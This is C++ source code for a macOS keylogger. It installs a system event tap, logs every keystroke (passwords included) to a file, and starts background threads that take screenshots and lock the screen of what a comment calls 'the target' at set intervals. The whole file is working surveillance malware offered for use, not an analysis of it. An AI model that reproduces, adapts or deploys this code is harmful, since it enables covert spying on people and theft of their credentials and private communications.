// OSX version of the keylogger
///This is a C++ implementation since there was no pyHook alternative in python

// File includes
#include "keylogger.hpp"

// Adding supoort for additional future arguments
int main(int argc, char * argv[]) 
{

	// Get old flags
	CGEventFlags oldFlags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
	// Setup masking Bits to create an appropriate event tap
	CGEventMask bitMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));

	// Create Event tap and specify the call back function
	CFMachPortRef eventHook = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, bitMask, logKeyPresses, &oldFlags);

	// Check to see that the eventTap was successfully created
	if(!eventHook)
	{
		fprintf(stderr, "Unable to successfully create event tap, exiting\n");
		exit(1);
	}

	// Create an event loop and add our keyboard hook to the event loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventHook, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventHook, true);

    /*
    *   structure of command line args : ./keylogger "filename" "screenshot:xx" "lockscreen:yy"
    *   filename = name of file that we want to log the keystrokes in
    *
    *   screenshot:xx, xx is the frequency in minutes that you want to take a screen shot,
    *                   if xx = 0, then the screenshotting feature is disabled
    *
    *   lockscreen:yy, yy is the frequency that you want to lock the target's screen in minutes
    *                  if yy = 0, then the lock screen feature will be disabled
    */

    if(argc != 4)
    {
        fprintf(stderr, "Invalid number or arguments, number of args is supposed to be 4, only %d args were entered", argc);
        exit(1);
    }
    else
    {
        /* set the filename specified and set it to the correct path */
        logFileName = argv[1];

        if(logFileName == NULL)
        {
            fprintf(stderr, "Invalid format, logFileName was null, exiting");
            exit(1);
        }

        /* check the frequency on screenshots */
        char * tokenizer = strtok(argv[2], ":");
        if(tokenizer == NULL)
        {
            fprintf(stderr, "Unable to tokenize screenshot parameter, exiting");
            exit(1);
        }
        else
        {
            //fprintf(stdout,"%s\n", argv[2]);
            if(strcmp(tokenizer, "screenshot"))
            {
                fprintf(stderr, "incorrect second parameter, parameter listed as %s\n", argv[2]);
                exit(1);
            }

            tokenizer = strtok(NULL, ":");
            if(tokenizer != NULL)
            {
                // Get the frequency of screen shots
                screenshotFrequency = atoi(tokenizer);
                //fprintf(stdout,"screenshot frequency is : %d\n", screenshotFrequency);
                if(screenshotFrequency == 0)
                {
                    // frequency is 0, therefore we are not screenshotting
                    screenshotEnabled = false;
                }
                else
                {
                    screenshotEnabled = true;
                }

                //fprintf(stdout,"screenshoting is %d\n", screenshotEnabled);
            }
        }

        tokenizer = strtok(argv[3], ":");
        if(tokenizer == NULL)
        {
            fprintf(stderr, "Unable to tokenize lockscreen parameter, exiting");
            exit(1);
        }
        else
        {
            //fprintf(stdout,"%s\n", argv[3]);
            if(strcmp(tokenizer, "lockscreen"))
            {
                fprintf(stderr, "incorrect third parameter, parameter listed as %s\n", argv[3]);
                exit(1);
            }

            tokenizer = strtok(NULL, ":");
            if(tokenizer != NULL)
            {
                // Get the frequency of screen shots
                lockscreenFrequency = atoi(tokenizer);
                //fprintf(stdout,"lockscreen frequency is : %d\n", lockscreenFrequency);
                if(lockscreenFrequency == 0)
                {
                    // frequency is 0, therefore we are not screenshotting
                    lockscreenEnabled = false;
                }
                else
                {
                    lockscreenEnabled = true;
                }

                //fprintf(stdout, "locking the screen is %d\n", lockscreenEnabled);
            }
        }
    }

    // Create the logFile and get time that the key logging has started
    time_t logTime = time(NULL);
    logFile = fopen(logFileName, "a");

    //Check to see whether or not we have successfully opened the log file
    if(!logFile)
    {
    	fprintf(stderr, "Unable to open logfile! Exiting\n");
    	exit(1);
    }

    fprintf(logFile, "%s\n", asctime(localtime(&logTime)));
    fflush(logFile);

    //Start Event Loop and Listen for keypresses
    if(screenshotEnabled)
    {
        pthread_create(&screenshotThread, NULL, takeScreenshot, NULL);
    }

    if(lockscreenEnabled)
    {
        pthread_create(&lockThread, NULL, lockScreen, NULL);
    }

    // start hooking input
    CFRunLoopRun();

    return 0;
}

// This is the callback function invoked every time a keypress occurs
CGEventRef logKeyPresses(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* userInfo)
{
    // Not the proper type of event, so we don't want to do any logging
	if(type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp)
	{
		return event;
	}


    // Get the value of the keycode pressed
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    if(keyCode == LEFTSHIFT || keyCode == RIGHTSHIFT || keyCode == CAPSLOCK)
    {   // the shift key was pressed and potentially still held down
        shiftPressed = shiftPressed ? false : true;
        //fprintf(logFile, "%d\n", shiftPressed);
    }
    else if(keyCode == NEWLINE)
    {   // This is the newline, print out the buffer
        fprintf(logFile, "%s\n", logBuffer.c_str());
        fflush(logFile);
        logBuffer = "";

    }
    else if(keyCode == BACKSPACE)
    {
        // Delete the last character if any characters are currently in the buffer
        if(logBuffer.length() > 0)
        {
            logBuffer.pop_back();
        }
    }
    else if(shiftPressed)
    {
        // Shift is held down, convert to the shifted character
        logBuffer += convertShiftedKeyCode(keyCode);
    }
    else
    {
        logBuffer += convertKeyCode(keyCode);   
    }

	return event;

}

void * takeScreenshot(void * flags)
{
    while(1)
    {
        sleep(60 * screenshotFrequency);
        system(PYSCREENSHOT);
    }
    pthread_exit(NULL);

}

void * lockScreen(void * flags)
{
    while(1)
    {
        sleep(60 * lockscreenFrequency);
        system(LOCKSCREEN);   
    }
    pthread_exit(NULL);
}

string convertShiftedKeyCode(int keyCode)
{
    switch((int)keyCode)
    {
        case 0:   return "A";
        case 1:   return "S";
        case 2:   return "D";
        case 3:   return "F";
        case 4:   return "H";
        case 5:   return "G";
        case 6:   return "Z";
        case 7:   return "x";
        case 8:   return "C";
        case 9:   return "V";
        case 11:  return "B";
        case 12:  return "Q";
        case 13:  return "W";
        case 14:  return "E";
        case 15:  return "R";
        case 16:  return "Y";
        case 17:  return "T";
        case 18:  return "!";
        case 19:  return "@";
        case 20:  return "#";
        case 21:  return "$";
        case 22:  return "^";
        case 23:  return "%";
        case 24:  return "+";
        case 25:  return "(";
        case 26:  return "&";
        case 27:  return "_";
        case 28:  return "*";
        case 29:  return ")";
        case 30:  return "}";
        case 31:  return "O";
        case 32:  return "U";
        case 33:  return "{";
        case 34:  return "I";
        case 35:  return "P";
        case 37:  return "L";
        case 38:  return "J";
        case 39:  return "\"";
        case 40:  return "K";
        case 41:  return ":";
        case 42:  return "|";
        case 43:  return "<";
        case 44:  return "?";
        case 45:  return "N";
        case 46:  return "M";
        case 47:  return ">";
        case 49:  return " ";
        case 50:  return "~";
    }

    return "";
}

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
string convertKeyCode(int keyCode) {
    switch ((int) keyCode) {
        case 0:   return "a";
        case 1:   return "s";
        case 2:   return "d";
        case 3:   return "f";
        case 4:   return "h";
        case 5:   return "g";
        case 6:   return "z";
        case 7:   return "x";
        case 8:   return "c";
        case 9:   return "v";
        case 11:  return "b";
        case 12:  return "q";
        case 13:  return "w";
        case 14:  return "e";
        case 15:  return "r";
        case 16:  return "y";
        case 17:  return "t";
        case 18:  return "1";
        case 19:  return "2";
        case 20:  return "3";
        case 21:  return "4";
        case 22:  return "6";
        case 23:  return "5";
        case 24:  return "=";
        case 25:  return "9";
        case 26:  return "7";
        case 27:  return "-";
        case 28:  return "8";
        case 29:  return "0";
        case 30:  return "]";
        case 31:  return "o";
        case 32:  return "u";
        case 33:  return "[";
        case 34:  return "i";
        case 35:  return "p";
        case 37:  return "l";
        case 38:  return "j";
        case 39:  return "'";
        case 40:  return "k";
        case 41:  return ";";
        case 42:  return "\\";
        case 43:  return ",";
        case 44:  return "/";
        case 45:  return "n";
        case 46:  return "m";
        case 47:  return ".";
        case 50:  return "`";
        case 65:  return ".";
        case 67:  return "*";
        case 69:  return "+";
        case 71:  return "[clear]";
        case 75:  return "/";
        case 76:  return "";
        case 78:  return "-";
        case 81:  return "=";
        case 82:  return "0";
        case 83:  return "1";
        case 84:  return "2";
        case 85:  return "3";
        case 86:  return "4";
        case 87:  return "5";
        case 88:  return "6";
        case 89:  return "7";
        case 91:  return "8";
        case 92:  return "9";
        case 36:  return "\n";
        case 48:  return "\t";
        case 49:  return " ";
        case 51:  return "";
        case 53:  return "[esc]";
        case 55:  return "[cmd]";
        case 56:  return "";
        case 57:  return "";
        case 58:  return "[option]";
        case 59:  return "[ctrl]";
        case 60:  return "";
        case 61:  return "[option]";
        case 62:  return "[ctrl]";
        case 63:  return "[fn]";
        case 64:  return "[f17]";
        case 72:  return "[volup]";
        case 73:  return "[voldown]";
        case 74:  return "[mute]";
        case 79:  return "[f18]";
        case 80:  return "[f19]";
        case 90:  return "[f20]";
        case 96:  return "[f5]";
        case 97:  return "[f6]";
        case 98:  return "[f7]";
        case 99:  return "[f3]";
        case 100: return "[f8]";
        case 101: return "[f9]";
        case 103: return "[f11]";
        case 105: return "[f13]";
        case 106: return "[f16]";
        case 107: return "[f14]";
        case 109: return "[f10]";
        case 111: return "[f12]";
        case 113: return "[f15]";
        case 114: return "[help]";
        case 115: return "[home]";
        case 116: return "[pgup]";
        case 117: return "[fwddel]";
        case 118: return "[f4]";
        case 119: return "[end]";
        case 120: return "[f2]";
        case 121: return "[pgdown]";
        case 122: return "[f1]";
        case 123: return "[left]";
        case 124: return "[right]";
        case 125: return "[down]";
        case 126: return "[up]";
    }
    return "";
}